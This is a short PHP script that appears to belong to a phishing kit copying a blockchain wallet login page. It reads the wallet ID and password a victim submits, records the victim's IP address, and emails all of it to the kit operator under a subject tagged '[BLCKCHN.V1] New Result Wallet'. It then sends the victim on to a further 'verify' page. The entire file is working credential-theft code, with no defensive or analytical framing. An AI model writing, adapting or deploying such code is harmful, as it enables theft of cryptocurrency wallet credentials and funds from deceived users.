<?php
include 'function.php';
include '../email.php';
include 'hostname_check.php';
$ip = getenv("REMOTE_ADDR");
$_SESSION['Wallet_ID']=$_POST['wall-id'];
$_SESSION['Wallet_Password']=$_POST['pass-id'];
$ip=$_SESSION['ip']=getip();
$subject=$_SESSION['subject']="[BLCKCHN.V1] New Result Wallet | ".$ip."" . "\r\n";
send($_SESSION,$to,$subject) ; 
header("Location: verify.html");
?>